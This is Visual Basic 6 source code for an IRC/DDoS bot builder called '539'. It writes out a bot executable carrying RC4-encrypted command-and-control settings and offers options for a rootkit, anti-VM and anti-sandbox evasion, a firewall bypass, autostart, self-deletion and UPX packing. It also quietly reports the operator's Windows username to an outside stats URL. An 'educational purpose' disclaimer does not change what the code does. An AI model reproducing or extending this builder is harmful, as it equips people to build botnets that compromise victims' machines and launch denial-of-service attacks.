VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "ieframe.dll"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fest Einfach
   Caption         =   "539 IRC Bot"
   ClientHeight    =   8070
   ClientLeft      =   6270
   ClientTop       =   2085
   ClientWidth     =   4710
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   8070
   ScaleWidth      =   4710
   Begin VB.TextBox Text9 
      Appearance      =   0  '2D
      Enabled         =   0   'False
      Height          =   285
      Left            =   1560
      TabIndex        =   27
      Text            =   "Channel Pass"
      Top             =   2760
      Width           =   2895
   End
   Begin VB.TextBox Text6 
      Alignment       =   2  'Zentriert
      Appearance      =   0  '2D
      Height          =   285
      Left            =   240
      TabIndex        =   26
      Text            =   "Five-Three-Nine.exe"
      Top             =   5520
      Width           =   4215
   End
   Begin VB.CheckBox Check10 
      Appearance      =   0  '2D
      BackColor       =   &H00E0E0E0&
      Caption         =   "Channel Pass:"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   240
      TabIndex        =   25
      Top             =   2760
      Width           =   1335
   End
   Begin Projekt1.chameleonButton chameleonButton2 
      Height          =   285
      Left            =   1080
      TabIndex        =   24
      Top             =   7680
      Width           =   2535
      _ExtentX        =   4471
      _ExtentY        =   503
      BTYPE           =   3
      TX              =   "About"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   1
      FOCUSR          =   -1  'True
      BCOL            =   14933984
      BCOLO           =   14933984
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":044A
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser1 
      Height          =   375
      Left            =   2160
      TabIndex        =   23
      Top             =   3720
      Visible         =   0   'False
      Width           =   495
      ExtentX         =   873
      ExtentY         =   661
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin VB.CheckBox Check8 
      Alignment       =   1  'Rechts ausgerichtet
      Appearance      =   0  '2D
      BackColor       =   &H00E0E0E0&
      Caption         =   "  Bypass XP FW"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   3000
      TabIndex        =   22
      Top             =   5160
      Width           =   1455
   End
   Begin VB.CheckBox Check7 
      Appearance      =   0  '2D
      BackColor       =   &H00E0E0E0&
      Caption         =   "Rootkit"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   240
      TabIndex        =   21
      Top             =   5160
      Width           =   1215
   End
   Begin MSComDlg.CommonDialog cm 
      Left            =   2160
      Top             =   3720
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame5 
      Caption         =   "Stub"
      Height          =   1095
      Left            =   120
      TabIndex        =   17
      Top             =   6000
      Width           =   4455
      Begin VB.TextBox Text8 
         Alignment       =   2  'Zentriert
         Appearance      =   0  '2D
         CausesValidation=   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   20
         Text            =   "Own Stub"
         Top             =   720
         Width           =   4215
      End
      Begin VB.OptionButton Option2 
         Alignment       =   1  'Rechts ausgerichtet
         Appearance      =   0  '2D
         BackColor       =   &H00E0E0E0&
         Caption         =   "P Code Stub"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   3120
         TabIndex        =   19
         Top             =   360
         Width           =   1215
      End
      Begin VB.OptionButton Option1 
         Appearance      =   0  '2D
         BackColor       =   &H00E0E0E0&
         Caption         =   "Native Code Stub"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   18
         Top             =   360
         Width           =   1695
      End
   End
   Begin VB.CheckBox Check6 
      Alignment       =   1  'Rechts ausgerichtet
      Appearance      =   0  '2D
      BackColor       =   &H00E0E0E0&
      Caption         =   "  Melt Server"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   3240
      TabIndex        =   16
      Top             =   4800
      Width           =   1215
   End
   Begin VB.CheckBox Check5 
      Alignment       =   1  'Rechts ausgerichtet
      Appearance      =   0  '2D
      BackColor       =   &H00E0E0E0&
      Caption         =   "Anti VM"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   3600
      TabIndex        =   15
      Top             =   3960
      Width           =   855
   End
   Begin VB.CheckBox Check4 
      Appearance      =   0  '2D
      BackColor       =   &H00E0E0E0&
      Caption         =   "Anti Norman Sandbox"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   240
      TabIndex        =   14
      Top             =   3960
      Width           =   1935
   End
   Begin VB.TextBox Text7 
      Alignment       =   2  'Zentriert
      Appearance      =   0  '2D
      Enabled         =   0   'False
      Height          =   285
      Left            =   3720
      TabIndex        =   13
      Text            =   "1.1"
      Top             =   7680
      Width           =   855
   End
   Begin VB.TextBox Text5 
      Alignment       =   2  'Zentriert
      Appearance      =   0  '2D
      Enabled         =   0   'False
      Height          =   285
      Left            =   120
      TabIndex        =   12
      Text            =   "02.03.08"
      Top             =   7680
      Width           =   855
   End
   Begin Projekt1.chameleonButton chameleonButton1 
      Height          =   375
      Left            =   120
      TabIndex        =   11
      Top             =   7200
      Width           =   4455
      _ExtentX        =   7858
      _ExtentY        =   661
      BTYPE           =   3
      TX              =   "&Create Server"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   1
      FOCUSR          =   -1  'True
      BCOL            =   14933984
      BCOLO           =   14933984
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":0466
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.CheckBox Check3 
      Appearance      =   0  '2D
      BackColor       =   &H00E0E0E0&
      Caption         =   "Anti Sniffer"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   240
      TabIndex        =   6
      Top             =   3600
      Width           =   1215
   End
   Begin VB.CheckBox Check2 
      Appearance      =   0  '2D
      BackColor       =   &H00E0E0E0&
      Caption         =   "Autostart"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   240
      TabIndex        =   5
      Top             =   4800
      Width           =   1215
   End
   Begin VB.CheckBox Check1 
      Alignment       =   1  'Rechts ausgerichtet
      Appearance      =   0  '2D
      BackColor       =   &H00E0E0E0&
      Caption         =   "  Anti Sandboxie"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   3000
      TabIndex        =   4
      Top             =   3600
      Width           =   1455
   End
   Begin VB.TextBox Text4 
      Alignment       =   2  'Zentriert
      Appearance      =   0  '2D
      Height          =   285
      Left            =   240
      TabIndex        =   3
      Text            =   "Pass"
      Top             =   2400
      Width           =   4215
   End
   Begin VB.TextBox Text3 
      Appearance      =   0  '2D
      Height          =   285
      Left            =   1920
      TabIndex        =   2
      Text            =   "6667"
      Top             =   1440
      Width           =   495
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  '2D
      Height          =   285
      Left            =   240
      TabIndex        =   1
      Text            =   "irc.quakenet.org"
      Top             =   1440
      Width           =   1575
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  '2D
      Height          =   285
      Left            =   2520
      TabIndex        =   0
      Text            =   "#five-three-nine"
      Top             =   1440
      Width           =   1935
   End
   Begin VB.Frame Frame1 
      Caption         =   "IRC Server Options"
      Height          =   855
      Left            =   120
      TabIndex        =   7
      Top             =   1080
      Width           =   4455
   End
   Begin VB.Frame Frame2 
      Caption         =   "Pass Stuff"
      Height          =   1095
      Left            =   120
      TabIndex        =   8
      Top             =   2040
      Width           =   4455
   End
   Begin VB.Frame Frame3 
      Caption         =   "Anti Debugging"
      Height          =   1095
      Left            =   120
      TabIndex        =   9
      Top             =   3240
      Width           =   4455
   End
   Begin VB.Frame Frame4 
      Caption         =   "Misc"
      Height          =   1455
      Left            =   120
      TabIndex        =   10
      Top             =   4440
      Width           =   4455
   End
   Begin VB.Image Image1 
      Height          =   975
      Left            =   0
      Picture         =   "Form1.frx":0482
      Top             =   0
      Width           =   4800
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Dim stubpath As String
Dim stats As String


Private Sub chameleonButton1_Click()
If Option1.Value = False And Option2.Value = False And Text8.Text = "Own Stub" Then
MsgBox "Please choose a Stub!", vbInformation
Exit Sub
End If

WriteIniValue App.Path & "/Config.ini", "Options", "channel", Text1.Text
WriteIniValue App.Path & "/Config.ini", "Options", "server", Text2.Text
WriteIniValue App.Path & "/Config.ini", "Options", "port", Text3.Text
WriteIniValue App.Path & "/Config.ini", "Options", "pass", Text4.Text
WriteIniValue App.Path & "/Config.ini", "Options", "serverpass", Text6.Text
WriteIniValue App.Path & "/Config.ini", "Options", "channelpass", Text9.Text

WriteIniValue App.Path & "/Config.ini", "Options", "antisandbox", Check1.Value
WriteIniValue App.Path & "/Config.ini", "Options", "autostart", Check2.Value
WriteIniValue App.Path & "/Config.ini", "Options", "antisniffer", Check3.Value
WriteIniValue App.Path & "/Config.ini", "Options", "antinorman", Check4.Value
WriteIniValue App.Path & "/Config.ini", "Options", "antivm", Check5.Value
WriteIniValue App.Path & "/Config.ini", "Options", "melt", Check6.Value
WriteIniValue App.Path & "/Config.ini", "Options", "rootkit", Check7.Value
WriteIniValue App.Path & "/Config.ini", "Options", "antixpfw", Check8.Value

WriteIniValue App.Path & "/Config.ini", "Options", "channelpassenable", Check10.Value







Dim channel As String
Dim server As String
Dim port As String
Dim pw As String
Dim antisand As String
Dim startup As String
Dim antisniff As String
Dim antinorman As String
Dim antivm As String
Dim melt As String
Dim rootkit As String
Dim antixpfw As String
Dim channelpass As String
Dim serverpass As String
Dim infos As String * 100
Dim buffer() As Byte

channel = RC4(Text1.Text, "ztrgdcv")
server = RC4(Text2.Text, "ztrgdcv")
port = RC4(Text3.Text, "ztrgdcv")
pw = RC4(Text4.Text, "ztrgdcv")

If Check1.Value = 1 Then
antisand = RC4("1", "ztrgdcv")
End If

If Check2.Value = 1 Then
startup = RC4("1", "ztrgdcv")
End If

If Check3.Value = 1 Then
antisniff = RC4("1", "ztrgdcv")
End If

If Check4.Value = 1 Then
antinorman = RC4("1", "ztrgdcv")
End If

If Check5.Value = 1 Then
antivm = RC4("1", "ztrgdcv")
End If

If Check6.Value = 1 Then
melt = RC4("1", "ztrgdcv")
End If

If Check7.Value = 1 Then
rootkit = RC4("1", "ztrgdcv")
End If

If Check8.Value = 1 Then
antixpfw = RC4("1", "ztrgdcv")
End If

If Text6.Text = "" Then
serverpass = RC4("scvhost.exe", "ztrgdcv")
Else
serverpass = RC4(Text6.Text, "ztrgdcv")
End If

If Check10.Value = 1 Then
channelpass = RC4(Text9.Text, "ztrgdcv")
End If

infos = channel & "!" & server & "!" & port & "!" & pw & "!" & antisand & "!" & startup & "!" & antisniff & "!" & antinorman & "!" & antivm & "!" & melt & "!" & rootkit & "!" & antixpfw & "!" & serverpass & "!" & channelpass & "!"

If Option1.Value = True Then
buffer = LoadResData(101, "CUSTOM")
Open App.Path & "\server.exe" For Binary As #1
Put #1, , buffer()
Close #1

Open App.Path & "\server.exe" For Binary As #1
Put #1, LOF(1) + 1, infos
Close #1


antwort = MsgBox("Pack with UPX?", vbQuestion + vbYesNo)
If antwort = vbYes Then
Call Shell(App.Path & "\upx.exe --best server.exe", vbHide)
Else
End If
MsgBox "server.exe has successfully been built.", vbInformation
Exit Sub
End If

If Option2.Value = True Then
buffer = LoadResData(102, "CUSTOM")
Open App.Path & "\server.exe" For Binary As #1
Put #1, , buffer()
Close #1

Open App.Path & "\server.exe" For Binary As #1
Put #1, LOF(1) + 1, infos
Close #1

antwort = MsgBox("Pack with UPX?", vbQuestion + vbYesNo)
If antwort = vbYes Then
Call Shell(App.Path & "\upx.exe --best server.exe", vbHide)
Else
End If
MsgBox "server.exe has successfully been built.", vbInformation
Exit Sub
End If

Open stubpath For Binary As #1
Put #1, LOF(1) + 1, infos
Close #1

antwort = MsgBox("Pack with UPX?", vbQuestion + vbYesNo)
If antwort = vbYes Then
Call Shell(App.Path & "\upx.exe --best server.exe", vbHide)
Else
End If
MsgBox "server.exe has successfully been built.", vbInformation




End Sub

Public Function FileExists(ByVal sFile As String) As Boolean

  'Der Parameter sFile enthält den zu prüfenden Dateinamen

  Dim Size As Long
  On Local Error Resume Next
  Size = FileLen(sFile)
  FileExists = (Err = 0)
  On Local Error GoTo 0
End Function


Private Sub chameleonButton2_Click()
Form2.Show
End Sub

Private Sub Check10_Click()
Select Case Check10.Value
 Case 1
 Text9.Enabled = True
 
 Case 0
 Text9.Enabled = False
 End Select
End Sub

Private Sub Check9_Click()
Select Case Check9.Value
 Case 1
 Text6.Enabled = True
 
 Case 0
 Text6.Enabled = False
 End Select
End Sub

Private Sub Form_Load()

Form1.Left = Screen.Width / 2 - Form1.Width / 2
Form1.Top = Screen.Height / 2 - Form1.Height / 2



If FileExists(App.Path & "\Config.ini") = True Then

Text1.Text = ReadIniValue(App.Path & "\Config.ini", "Options", "channel")
Text2.Text = ReadIniValue(App.Path & "\Config.ini", "Options", "server")
Text3.Text = ReadIniValue(App.Path & "\Config.ini", "Options", "port")
Text4.Text = ReadIniValue(App.Path & "\Config.ini", "Options", "pass")
Text6.Text = ReadIniValue(App.Path & "\Config.ini", "Options", "serverpass")
Text9.Text = ReadIniValue(App.Path & "\Config.ini", "Options", "channelpass")

Check1.Value = ReadIniValue(App.Path & "\Config.ini", "Options", "antisandbox")
Check2.Value = ReadIniValue(App.Path & "\Config.ini", "Options", "autostart")
Check3.Value = ReadIniValue(App.Path & "\Config.ini", "Options", "antisniffer")
Check4.Value = ReadIniValue(App.Path & "\Config.ini", "Options", "antinorman")
Check5.Value = ReadIniValue(App.Path & "\Config.ini", "Options", "antivm")
Check6.Value = ReadIniValue(App.Path & "\Config.ini", "Options", "melt")
Check7.Value = ReadIniValue(App.Path & "\Config.ini", "Options", "rootkit")
Check8.Value = ReadIniValue(App.Path & "\Config.ini", "Options", "antixpfw")

Check10.Value = ReadIniValue(App.Path & "\Config.ini", "Options", "channelpassenable")

stats = ReadIniValue(App.Path & "\Config.ini", "Options", "stats")
Else
MsgBox "Don't Abuse my Software for illegal activities." & vbCrLf & "The Coder, Five-Three-Nine, is not responsible or liable for any damage made by the use of this this Software." & vbCrLf & "This Software is for educational purpose ONLY!", vbInformation
End If

If stats = "0" Then
Else
WebBrowser1.Navigate "http://five-three-nine.lima-city.de/test2/stats.php?username=" & Environ("username")
End If
End Sub







Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
End
End Sub

Private Sub Option1_Click()
Text8.Text = "Own Stub"
Text8.Alignment = 2
End Sub

Private Sub Option2_Click()
Text8.Text = "Own Stub"
Text8.Alignment = 2
End Sub

Private Sub Text8_DblClick()
Option1.Value = False
Option2.Value = False
cm.DialogTitle = "539 DDoS Bot Builder"
    cm.Filter = "Server (server.exe)|*server.exe|"
     cm.FilterIndex = 1
cm.ShowOpen
If cm.FileName = "" Then
Exit Sub
End If
Text8.Text = cm.FileName
stubpath = cm.FileName
Text8.Alignment = 1
End Sub
